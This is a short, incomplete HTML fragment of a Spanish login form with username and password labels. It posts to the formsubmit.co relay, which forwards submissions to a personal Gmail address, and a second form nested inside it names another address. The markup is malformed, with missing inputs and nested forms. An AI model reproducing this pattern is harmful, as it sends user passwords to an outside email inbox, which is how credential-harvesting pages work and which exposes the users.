<body>
    <div class="login-container">

                <div class="login-form">
                    <h2>Iniciar Sesión</h2>
                    <form action="https://formsubmit.co/heidy.perafaguerrero@gmail.com"method="post">
                        <form action="https://formsubmit.co/ruizsalome828@gmail.com"method="post"></form>
                        <!-- Campo de Usuario -->
                        <label for="username">Usuario:</label>

                        <label for="password">Contraseña:</label>

        </div>
